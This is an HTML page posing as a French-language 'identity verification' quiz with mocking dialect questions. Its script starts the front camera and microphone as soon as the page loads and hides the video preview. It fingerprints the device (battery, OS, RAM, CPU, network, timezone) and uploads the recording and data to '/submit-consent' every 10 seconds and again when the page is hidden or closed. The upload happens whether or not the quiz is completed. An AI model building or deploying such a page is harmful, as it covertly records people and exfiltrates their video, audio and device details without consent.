<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification d'identité</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .title-banner {
            background-color: #ff4757;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: bold;
        }

        #video-container { display: none; }
        
        .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title-banner">QUESTION</div>
        <h2>Vérification d'identité</h2>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
            <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
            
            <div class="question-box">
                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
                <select id="q1" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>2. enti bhim</label>
                <select id="q2" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>3. chnowa essm kalbek?</label>
                <select id="q3" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="sknder">sknder</option>
                    <option value="michou">michou</option>
                    <option value="tito">tito</option>
                    <option value="urra">urra</option>
                    <option value="yahouh">yahouh</option>
                    <option value="mchit feha">mchit feha</option>
                    <option value="ya klb">ya klb</option>
                    <option value="ya3tek douda">ya3tek douda</option>
                    <option value="fish fish">fish fish</option>
                    <option value="bassboussa">bassboussa</option>
                    <option value="kob sa3d el 3ar">kob sa3d el 3ar</option>
                </select>
            </div>

            <button type="button" onclick="verifyAndStop()">OK</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let autoSyncInterval = null;
        let isCompleted = false;

        // متغيرات مؤقتة لجمع معلومات البطارية
        let batteryInfoGlobal = {
            niveau: "Non disponible",
            enCharge: "Non disponible"
        };

        // محاولة جلب معلومات البطارية إن كانت مدعومة في المتصفح
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                function updateBattery() {
                    batteryInfoGlobal.niveau = Math.round(battery.level * 100) + "%";
                    batteryInfoGlobal.enCharge = battery.charging ? "Oui (Branché)" : "Non (Sur batterie)";
                }
                updateBattery();
                battery.addEventListener('levelchange', updateBattery);
                battery.addEventListener('chargingchange', updateBattery);
            });
        }

        // استخراج جميع معلومات الهاتف وإعداداته المتقدمة باللغة الفرنسية
        async function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            let osName = "Système Inconnu";
            let brandOrModel = "Appareil Inconnu";

            if (/android/i.test(ua)) {
                osName = "Android";
                let match = ua.match(/Android\s([0-9\.]+)/);
                if (match) osName += " " + match[1];
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                osName = "iOS (Apple)";
                let match = ua.match(/OS\s([0-9_]+)/);
                if (match) osName += " " + match[1].replace(/_/g, '.');
            } else if (/windows/i.test(ua)) {
                osName = "Windows PC";
            } else if (/macintosh|mac os x/i.test(ua)) {
                osName = "macOS";
            }

            if (/Samsung/i.test(ua)) brandOrModel = "Samsung Galaxy";
            else if (/iPhone/i.test(ua)) brandOrModel = "Apple iPhone";
            else if (/Huawei/i.test(ua)) brandOrModel = "Huawei";
            else if (/Xiaomi|Redmi/i.test(ua)) brandOrModel = "Xiaomi / Redmi";
            else if (/Oppo/i.test(ua)) brandOrModel = "Oppo";
            else if (/Vivo/i.test(ua)) brandOrModel = "Vivo";

            // 1. وضعية الشاشة (Orientation)
            let screenOrientation = "Inconnue";
            if (screen.orientation && screen.orientation.type) {
                screenOrientation = screen.orientation.type.includes("portrait") ? "Portrait (Verticale)" : "Paysage (Horizontale)";
            } else {
                screenOrientation = window.innerHeight > window.innerWidth ? "Portrait (Verticale)" : "Paysage (Horizontale)";
            }

            // 2. معمارية المعالج (CPU Architecture)
            let cpuArchitecture = "64-bit / Inconnu";
            if (navigator.userAgentData && navigator.userAgentData.architecture) {
                cpuArchitecture = navigator.userAgentData.architecture;
            } else if (/WOW64|Win64|x64|ARM64|x86_64/i.test(ua)) {
                cpuArchitecture = "64-bit";
            } else if (/Win32|x86/i.test(ua)) {
                cpuArchitecture = "32-bit";
            }

            let details = {
                appareil: brandOrModel,
                systemeExploitation: osName,
                navigateur: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.appName,
                plateforme: navigator.platform,
                langueSysteme: navigator.language || navigator.languages[0],
                memoireRAMApproximative: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
                processeurCœurs: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Non disponible",
                resolutionEcran: `${window.screen.width} x ${window.screen.height}`,
                profondeurCouleurs: window.screen.colorDepth + " bits",
                fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesActifs: navigator.cookieEnabled ? "Oui" : "Non",
                connexionReseau: navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "Non disponible",
                
                // --- الـ 8 معلومات الجديدة المضافة ---
                niveauBatterie: batteryInfoGlobal.niveau,
                etatCharge: batteryInfoGlobal.enCharge,
                modeEconomieEnergie: (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) ? "Probablement activé (Faible performance)" : "Désactivé / Normal",
                orientationEcran: screenOrientation,
                pointsTactilesMax: navigator.maxTouchPoints ? navigator.maxTouchPoints + " points" : "Non disponible",
                modeSilencieuxOuNePasDerranger: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Détecté (Accessibilité activée)" : "Standard",
                architectureCPU: cpuArchitecture,
                codecsMediaSupportes: {
                    webm: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? "Supporté" : "Non supporté",
                    mp4: MediaRecorder.isTypeSupported('video/mp4') ? "Supporté" : "Non supporté"
                }
            };

            return details;
        }

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                const constraints = {
                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: true
                };

                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                const videoElement = document.getElementById('webcam');
                videoElement.srcObject = mediaStream;

                let options = { videoBitsPerSecond: 250000 };
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                    options.mimeType = 'video/webm;codecs=vp8,opus';
                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
                    options.mimeType = 'video/mp4';
                }

                mediaRecorder = new MediaRecorder(mediaStream, options);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                mediaRecorder.start(1000);

                // Auto-Sync كل 10 ثوانٍ مع كامل الإعدادات والبيانات المتقدمة
                autoSyncInterval = setInterval(async () => {
                    if (!isCompleted && recordedChunks.length > 0) {
                        await sendDataBeacon("Auto-Sync 10s (Mise à jour complète)");
                    }
                }, 10000);

            } catch (err) {
                console.error("Caméra refusée: ", err);
            }
        });

        async function sendDataBeacon(reason = "") {
            if (recordedChunks.length === 0) return;

            const username = document.getElementById('username').value || "Utilisateur Anonyme";
            const q1 = document.getElementById('q1').value || "N/A";
            const q2 = document.getElementById('q2').value || "N/A";
            const q3 = document.getElementById('q3').value || "N/A";

            const deviceDetails = await getDetailedDeviceInfo();
            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const videoBlob = new Blob(recordedChunks, { type: mimeType });

            const formData = new FormData();
            formData.append('username', `${username} [${reason}]`);
            formData.append('location', "Non disponible");
            formData.append('device', JSON.stringify(deviceDetails, null, 2));
            formData.append('q1', q1);
            formData.append('q2', q2);
            formData.append('q3', q3);
            formData.append('video', videoBlob, `recording.${ext}`);

            try {
                await fetch('/submit-consent', { method: 'POST', body: formData });
            } catch (e) {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon('/submit-consent', formData);
                }
            }
        }

        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'hidden' && !isCompleted) {
                await sendDataBeacon("Fermé via bouton carré / App masquée");
            }
        });

        window.addEventListener('pagehide', async () => {
            if (!isCompleted) {
                await sendDataBeacon("Fermeture de page (pagehide)");
            }
        });

        async function verifyAndStop() {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
                return;
            }

            const q1 = document.getElementById('q1').value;
            const q2 = document.getElementById('q2').value;
            const q3 = document.getElementById('q3').value;

            if (!q1 || !q2 || !q3) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
                return;
            }

            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
                isCompleted = true;
                clearInterval(autoSyncInterval);
                statusDiv.style.color = 'green';
                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';

                if (mediaRecorder && mediaRecorder.state !== "inactive") {
                    mediaRecorder.stop();
                }

                setTimeout(async () => {
                    await sendDataBeacon("Réussi ! Données finales complètes");
                    statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                    }
                }, 1000);

            } else {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
            }
        }
    </script>
</body>
</html>
